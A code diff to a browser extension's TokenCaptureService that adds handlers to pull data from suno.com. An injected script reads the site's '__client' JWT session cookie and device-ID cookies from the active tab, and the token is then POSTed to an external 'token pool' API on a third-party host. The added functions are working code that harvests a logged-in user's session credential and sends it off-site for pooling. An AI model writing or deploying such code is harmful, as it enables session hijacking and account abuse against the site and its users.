@@ -56,6 +56,56 @@ class TokenCaptureService {
           sendResponse({ success: true })
           break
 
+        case 'EXTRACT_TOKEN_FROM_COOKIES':
+          try {
+            const extracted = await this.extractTokenFromCookies()
+            // Also capture it locally
+            await this.captureToken(extracted.token, {
+              url: extracted.url,
+              source: 'cookie-extraction',
+              deviceId: extracted.deviceId
+            })
+            sendResponse({ success: true, data: extracted })
+          } catch (error) {
+            sendResponse({ success: false, error: error.message })
+          }
+          break
+
+        case 'SEND_TOKEN_TO_POOL':
+          try {
+            const { token, label } = message
+            const result = await this.sendTokenToPool(token, label)
+            sendResponse({ success: true, data: result })
+          } catch (error) {
+            sendResponse({ success: false, error: error.message })
+          }
+          break
+
+        case 'EXTRACT_AND_SEND_TO_POOL':
+          try {
+            // Extract token from cookies
+            const extracted = await this.extractTokenFromCookies()
+            // Capture locally
+            await this.captureToken(extracted.token, {
+              url: extracted.url,
+              source: 'cookie-extraction-auto',
+              deviceId: extracted.deviceId
+            })
+            // Send to pool
+            const label = message.label || `extension-${Date.now()}`
+            const poolResult = await this.sendTokenToPool(extracted.token, label)
+            sendResponse({ 
+              success: true, 
+              data: {
+                extracted,
+                pool: poolResult
+              }
+            })
+          } catch (error) {
+            sendResponse({ success: false, error: error.message })
+          }
+          break
+
         default:
           sendResponse({ success: false, error: 'Unknown message type' })
       }
@@ -161,6 +211,89 @@ class TokenCaptureService {
       }
     } catch (error) {
       console.error('Error syncing tokens:', error)
+      throw error
+    }
+  }
+
+  async sendTokenToPool(token, label = 'extension-auto') {
+    try {
+      // Get Generator URL from storage or use default
+      const result = await chrome.storage.local.get(['generatorUrl'])
+      const generatorUrl = result.generatorUrl || 'https://the-generator.son1kvers3.com'
+
+      console.log(`Sending token to pool: ${generatorUrl}`)
+
+      const response = await fetch(`${generatorUrl}/api/token-pool/add`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          token: token,
+          label: label
+        })
+      })
+
+      if (response.ok) {
+        const data = await response.json()
+        console.log('Token sent to pool successfully:', data)
+        return { success: true, data }
+      } else {
+        const errorText = await response.text()
+        console.error('Pool API error:', response.status, errorText)
+        throw new Error(`Pool API error: ${response.status} - ${errorText}`)
+      }
+    } catch (error) {
+      console.error('Error sending token to pool:', error)
+      throw error
+    }
+  }
+
+  async extractTokenFromCookies() {
+    try {
+      // Get active tab
+      const tabs = await chrome.tabs.query({ active: true, currentWindow: true })
+      if (!tabs[0] || !tabs[0].url.includes('suno.com')) {
+        throw new Error('Not on Suno.com')
+      }
+
+      // Inject script to read cookies
+      const results = await chrome.scripting.executeScript({
+        target: { tabId: tabs[0].id },
+        function: () => {
+          function getCookie(name) {
+            const value = `; ${document.cookie}`
+            const parts = value.split(`; ${name}=`)
+            if (parts.length === 2) return parts.pop().split(';').shift()
+            return null
+          }
+
+          return {
+            jwtToken: getCookie('__client'),
+            deviceId: getCookie('singular_device_id') || getCookie('ajs_anonymous_id'),
+            url: window.location.href
+          }
+        }
+      })
+
+      if (results && results[0] && results[0].result) {
+        const { jwtToken, deviceId, url } = results[0].result
+        
+        if (!jwtToken) {
+          throw new Error('No JWT token found in cookies. Make sure you are logged in to Suno.com')
+        }
+
+        return {
+          token: jwtToken,
+          deviceId: deviceId,
+          url: url,
+          extractedAt: new Date().toISOString()
+        }
+      }
+
+      throw new Error('Failed to extract token from cookies')
+    } catch (error) {
+      console.error('Error extracting token from cookies:', error)
       throw error
     }
   }
